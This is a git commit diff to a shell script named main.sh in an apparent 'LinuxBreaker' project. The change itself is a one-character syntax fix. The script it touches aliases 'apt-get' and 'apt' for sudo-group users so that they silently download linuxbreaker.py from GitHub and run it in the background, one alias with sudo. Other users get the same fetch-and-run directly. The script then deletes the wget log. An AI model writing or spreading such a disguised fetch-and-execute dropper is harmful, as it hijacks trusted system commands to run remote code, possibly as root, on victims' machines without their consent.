58aa0a6b1c8dd91810d8bac0acdb11b3cfafae18
User-2357 <85888218+User-2357@users.noreply.github.com>
2021-12-17 18:36:03 -0600

    Update main.sh

--- main.sh
+++ main.sh
@@ -5,6 +5,6 @@ wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/
 elif groups | grep "\<sudo\>" &> /dev/null; then
 alias apt-get="wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &";
 alias apt="wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; sudo python3 linuxbreaker.py &";
-else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &;
+else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
 fi
 rm wget-log
